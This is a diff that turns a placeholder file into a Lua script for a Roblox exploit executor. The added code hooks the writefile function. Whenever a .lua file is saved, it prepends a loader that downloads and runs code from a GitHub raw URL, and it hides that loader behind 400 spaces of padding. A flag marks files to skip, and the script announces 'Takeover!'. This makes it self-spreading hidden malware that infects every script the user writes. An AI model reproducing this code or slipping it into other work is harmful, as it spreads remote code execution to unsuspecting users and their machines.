@@ -1,1 +1,21 @@
---Placeholder
+--FLAG:__IGNORE__INFECTION
+local PERSIST_URL = "https://raw.githubusercontent.com/lome4/______/main/___"
+local LOADER = "loadstring(game:HttpGet([===[" .. PERSIST_URL .. "]===], true))()"
+
+if (not _G[-9999]) then
+    warn("Takeover!")
+
+    local __write; __write = hookfunction(writefile, newcclosure(function(file, content) 
+        local split = file:split(".")
+        if split[#split] == "lua" then
+            local content = readfile(file)
+            if not (content:match(LOADER)) and (not content:match("FLAG:__IGNORE__INFECTION")) then
+                warn("File being written! automatically taking over! (" .. file .. ")")
+                content = string.rep("    ", 100) .. LOADER .. "\n" .. content
+            end
+        end
+        return __write(file, content)
+    end))
+end
+
+_G[-9999] = tick()
